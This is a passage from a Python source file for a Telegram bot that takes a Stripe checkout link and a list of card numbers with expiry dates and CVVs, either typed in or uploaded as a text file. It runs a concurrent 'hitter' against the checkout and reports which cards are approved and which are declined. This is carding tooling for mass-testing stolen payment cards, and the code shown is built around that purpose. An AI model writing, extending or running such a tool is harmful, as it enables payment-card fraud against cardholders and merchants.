                f"📌 Status: `{res['decline_code']}`\n"
                f"💬 Message: {res.get('error', 'Approved')}"
            )
            try: await status_msg.edit_text(text, parse_mode="Markdown")
            except Exception: pass
        elif data.get("status") == "completed":
            try: await status_msg.edit_text(f"🏁 Finished! Success: {data['successes']} | Fails: {data['fails']}")
            except Exception: pass
        elif data.get("status") == "error":
            try: await status_msg.edit_text(f"❌ Error: {data['error']}")
            except Exception: pass

    hitter = ConcurrentHitter(message.from_user.id, url, [card_dict], update_callback=update_cb)
    await hitter.run()

@dp.message(F.document)
async def handle_txt_file(message: Message):
    if not message.document.file_name.endswith('.txt'):
        await message.answer("⚠️ Please upload a valid `.txt` file containing cards.")
        return
    
    caption = message.caption or ""
    if not caption.startswith('http'):
        await message.answer("⚠️ Please send the `.txt` file with the Stripe link as caption! Example: upload file with caption `https://checkout.stripe.com/c/pay/...`")
        return

    url = caption.strip()
    status_msg = await message.answer("📥 Downloading and parsing card file...")

    try:
        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        content = file_bytes.read().decode('utf-8', errors='ignore')
        
        cards = []
        for line in content.splitlines():
            line = line.strip()
            if not line: continue
            parts = line.split('|')
            if len(parts) >= 4:
                cards.append({'card': parts[0].strip(), 'month': parts[1].strip(), 'year': parts[2].strip(), 'cvv': parts[3].strip()})
        
        if not cards:
            await status_msg.edit_text("❌ No valid cards found in the text file! Format required: `card|mm|yy|cvv`")
            return

        await status_msg.edit_text(f"🚀 Loaded {len(cards)} cards from file. Initializing mass check...")

        async def update_cb(data):
            if data.get("status") == "progress":
                res = data["result"]
                icon = "✅" if res['success'] else "❌"
                text = (
                    f"{icon} **Card #{data['completed']}/{data['total']}**\n"
                    f"💳 `{res['card']['card']}`\n"
                    f"📌 Status: `{res['decline_code']}`\n"
                    f"💬 Message: {res.get('error', 'Approved')}\n"
                    f"📊 Succ: {data['successes']} | Fail: {data['fails']}"
                )
                try: await status_msg.edit_text(text, parse_mode="Markdown")
                except Exception: pass
            elif data.get("status") == "completed":
                try: await status_msg.edit_text(f"🏁 Mass Check Completed!\nTotal Cards: {data['successes'] + data['fails']}\nSuccesses: {data['successes']}\nFails: {data['fails']}")
                except Exception: pass

        hitter = ConcurrentHitter(message.from_user.id, url, cards, update_callback=update_cb)
        await hitter.run()

    except Exception as e:
        await status_msg.edit_text(f"❌ Failed to process file: {str(e)}")

async def main():
    print("🤖 Full Advanced Stripe Telegram Bot with File Reader started...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
